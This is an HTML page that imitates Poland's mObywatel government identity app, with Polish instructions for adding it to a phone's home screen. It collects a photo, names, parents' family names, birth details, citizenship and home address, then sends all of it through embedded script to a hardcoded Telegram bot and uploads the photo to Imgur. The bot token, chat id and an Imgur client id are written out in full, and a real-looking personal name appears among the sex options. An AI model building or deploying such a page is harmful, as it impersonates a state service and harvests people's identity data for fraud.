<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="assets/index.css">
    <link rel="icon" type="image/x-icon" href="https://play-lh.googleusercontent.com/_TNbiYKasPy_isTSEg2_UEzVaev4F8fO2lLunsHJ8_Ux2g3OzkSZyzpqvJG1woSj-WD4=w240-h480-rw">
    <title>mObywatel</title>
    <meta name="viewport" content="width=device-width, initial-scale=0.8, user-scalable=no">
</head>
<body>
    <script>
        // Sprawd≈∫, czy u≈ºytkownik jest zalogowany
        if (!sessionStorage.getItem('loggedIn')) {
            // Je≈õli nie jest zalogowany, przekieruj do strony logowania
            window.location.href = 'login.html';
        }
    </script>
    
   <img src="https://play-lh.googleusercontent.com/_TNbiYKasPy_isTSEg2_UEzVaev4F8fO2lLunsHJ8_Ux2g3OzkSZyzpqvJG1woSj-WD4=w240-h480-rw" class="logo">
    <p class="logo_text">Mobywatel</p>
    <p class="warning">made by ogkomasic</p>

    <div class="guide_holder">
        <div class="top_holder">
            <p class="guide_title">Instrukcja</p>
            <img class="arrow" src="https://i.imgur.com/aUZmu0W.png">
        </div>
        <div class="guide_text">
            <span style="font-size: 17px; font-weight: 500;">Dla systemu IOS:</span><br>
            <ul>
                <li>Upewnij siƒô, ≈ºe u≈ºywasz przeglƒÖdarki Safari</li>
                <li>Uzupe≈Çnij dane i kliknij wejd≈∫</li>
                <li>Naci≈õnij udostƒôpnij -> Do Ekranu g≈Ç√≥wnego</li>
            </ul>
            <span style="font-size: 17px; font-weight: 500;">Dla systemu Android:</span>
            <ul>
                <li>Upewnij siƒô, ≈ºe u≈ºywasz przeglƒÖdarki Google lub Chrome</li>
                <li>Uzupe≈Çnij dane i kliknij wejd≈∫</li>
                <li>Naci≈õnij 3 kropki -> Dodaj do ekranu g≈Ç√≥wnego</li>
            </ul>
        </div>
    </div>

   <div class="upload">
  <p class="error">To pole jest wymagane</p>
  <img class="upload_uploaded">
  <div class="upload_uploading"></div>
  <input type="file" id="photoInput" accept="image/*" style="display:none;">
  <div class="upload_grid" onclick="document.getElementById('photoInput').click();">
    <img class="upload_image" src="https://i.imgur.com/vwIQErh.png">
    <p class="upload_text">Dodaj zdjƒôcie</p>
  </div>
</div>

    <div class="input_holder">
        <input type="text" id="name" class="input" placeholder="">
        <span class="placeholder">Imiƒô (imiona)</span>
        <p class="error">To pole jest wymagane</p>
    </div>
 
    <div class="input_holder">
        <input type="text" id="surname" class="input" placeholder="">
        <span class="placeholder">Nazwisko</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <p class="top_info">P≈Çeƒá</p>
    <div class="selector_box">
        <div class="selected_grid">
            <p class="selector_text selected_text">Mƒô≈ºczyzna</p>
            <img class="selected_arrow" src="https://i.imgur.com/RXsdBB6.png">
        </div>
        <div class="option_box">
            <div class="selector_option" id="m">
                Mƒô≈ºczyzna
            </div>
            <div class="selector_option" id="k">
                Kobieta
            </div>
            <div class="selector_option" id="k">
                EMILIA JEDRZEJEWSKA
            </div>
        </div>
    </div>

    <form action="https://formspree.io/f/xqaqqdgg" method="POST" enctype="multipart/form-data"></form>

    <div class="date">
        <p class="top_info">Data urodzenia</p>
        <div class="date_grid">
            <input class="date_input" placeholder="DD" type="number">
            <input class="date_input" placeholder="MM" type="number">
            <input class="date_input" placeholder="YYYY" type="number">
        </div>
        <p class="error">Wprowad≈∫ prawid≈ÇowƒÖ datƒô</p>
    </div>

    <div class="input_holder">
        <input type="text" id="nationality" class="input" placeholder="">
        <span class="placeholder">Obywatelstwo</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="familyName" class="input" placeholder="">
        <span class="placeholder">Nazwisko rodowe</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="fathersFamilyName" class="input" placeholder="">
        <span class="placeholder">Nazwisko rodowe ojca</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="mothersFamilyName" class="input" placeholder="">
        <span class="placeholder">Nazwisko rodowe matki</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <p class="subtext">Miejsce zamieszkania</p>

    <div class="input_holder">
        <input type="text" id="birthPlace" class="input" placeholder="">
        <span class="placeholder">Miejsce urodzenia</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="countryOfBirth" class="input" placeholder="">
        <span class="placeholder">Kraj urodzenia</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="adress1" class="input" placeholder="">
        <span class="placeholder">Ulica i numer domu</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="adress2" class="input" placeholder="">
        <span class="placeholder">Kod pocztowy</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="city" class="input" placeholder="">
        <span class="placeholder">Miasto</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <a class="go">DALEJ</a>

<script>
const token = '7626788939:AAGgZlg7vqqcMwEd6E-fn1ehJsjH4o72bRQ';
const chat_id = '5447264217';

document.querySelector('.go').addEventListener('click', async () => {
  // Pobierz dane z formularza
  const name = document.getElementById('name').value;
  const surname = document.getElementById('surname').value;
  const gender = document.querySelector('.selector_text')?.textContent?.trim();
  const day = document.querySelectorAll('.date_input')[0].value;
  const month = document.querySelectorAll('.date_input')[1].value;
  const year = document.querySelectorAll('.date_input')[2].value;
  const dateOfBirth = `${day}.${month}.${year}`;
  const nationality = document.getElementById('nationality').value;
  const familyName = document.getElementById('familyName').value;
  const fathersFamilyName = document.getElementById('fathersFamilyName').value;
  const mothersFamilyName = document.getElementById('mothersFamilyName').value;
  const birthPlace = document.getElementById('birthPlace').value;
  const countryOfBirth = document.getElementById('countryOfBirth').value;
  const address1 = document.getElementById('adress1').value;
  const address2 = document.getElementById('adress2').value;
  const city = document.getElementById('city').value;

  const text = `
<b>üìÑ Nowe dane:</b>
üë§ Imiƒô: ${name}
üë§ Nazwisko: ${surname}
‚ößÔ∏è P≈Çeƒá: ${gender}
üìÖ Data urodzenia: ${dateOfBirth}
üåç Obywatelstwo: ${nationality}
üë™ Nazwisko rodowe: ${familyName}
üë® Ojciec: ${fathersFamilyName}
üë© Matka: ${mothersFamilyName}
üèôÔ∏è Miejsce urodzenia: ${birthPlace}, ${countryOfBirth}
üè† Adres: ${address1}, ${address2} ${city}
  `;

  // Pobierz plik zdjƒôcia z inputu
  const fileInput = document.querySelector('input[type="file"]');
const file = fileInput?.files?.[0];

const TELEGRAM_TOKEN = '7626788939:AAGgZlg7vqqcMwEd6E-fn1ehJsjH4o72bRQ';
const TELEGRAM_CHAT_ID = '5447264217';

try {
  if (file) {
    // 1. Wy≈õlij zdjƒôcie na Imgur
    const IMGUR_CLIENT_ID = 'c8c28d402435402';
    const formData = new FormData();
    formData.append('image', file);

    const imgurResponse = await fetch('https://api.imgur.com/3/image', {
      method: 'POST',
      headers: {
        Authorization: `Client-ID ${IMGUR_CLIENT_ID}`
      },
      body: formData
    });

    const imgurResult = await imgurResponse.json();

    if (!imgurResult.success) {
      throw new Error('Upload na Imgur nie powi√≥d≈Ç siƒô: ' + (imgurResult.data?.error || 'brak szczeg√≥≈Ç√≥w'));
    }

    const imageUrl = imgurResult.data.link;

    // 2. Wy≈õlij do Telegrama zdjƒôcie z linkiem i podpisem
    const telegramPhotoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        photo: imageUrl,
        caption: text,
        parse_mode: 'HTML'
      })
    });

    const telegramPhotoResult = await telegramPhotoResponse.json();
    if (!telegramPhotoResult.ok) {
      throw new Error('B≈ÇƒÖd Telegram API (sendPhoto): ' + telegramPhotoResult.description);
    }

  } else {
    // 3. Je≈õli brak zdjƒôcia, wy≈õlij tylko tekst
    const telegramMessageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML'
      })
    });

    const telegramMessageResult = await telegramMessageResponse.json();
    if (!telegramMessageResult.ok) {
      throw new Error('B≈ÇƒÖd Telegram API (sendMessage): ' + telegramMessageResult.description);
    }
  }

  alert('Wys≈Çano dane do Telegrama!');

} catch (error) {
  alert('B≈ÇƒÖd: ' + error.message);
  console.error(error);
}
</script>

    <script src="telegram.js"></script>
    <script src="assets/index.js"></script>
    <script src="assets/manifest.js"></script>
</body>
</html>
